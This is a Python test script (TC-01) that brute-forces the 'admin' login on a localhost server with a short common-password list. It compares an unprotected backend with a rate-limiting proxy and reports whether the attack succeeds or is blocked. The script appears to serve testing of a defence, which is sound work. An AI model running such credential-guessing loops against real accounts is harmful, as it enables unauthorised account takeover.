"""
TC-01 — Brute Force Attack Demo
Cycles through a password wordlist against a single account.
Run against :3000 (no protection) then :4000 (proxy) to compare.
"""
import requests
import time
import sys

TARGET  = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4000/login"
ACCOUNT = "admin"

PASSWORDS = [
    "123456", "password", "admin", "qwerty",
    "letmein", "secret123", "abc123"
]

print(f"\n{'='*55}")
print(f"  BRUTE FORCE ATTACK — target: {TARGET}")
print(f"  Account: {ACCOUNT}  |  Wordlist size: {len(PASSWORDS)}")
print(f"{'='*55}\n")

for i, pwd in enumerate(PASSWORDS, 1):
    try:
        r = requests.post(TARGET, json={"username": ACCOUNT, "password": pwd}, timeout=5)
        body = r.json()
        status_label = "SUCCESS" if r.status_code == 200 else ("BLOCKED" if r.status_code == 429 else "FAIL")
        print(f"Attempt {i:2d}: pass={pwd!r:15s}  status={r.status_code}  [{status_label}]  body={body}")
        if r.status_code == 200:
            print("\n>>> ATTACK SUCCEEDED — found valid credentials!")
            break
        if r.status_code == 429:
            print(f"\n>>> ATTACK BLOCKED by proxy at attempt {i}. Correct password never reached backend.")
            break
    except requests.exceptions.ConnectionError:
        print(f"Attempt {i}: Connection refused — is the server running at {TARGET}?")
        break
    time.sleep(0.1)
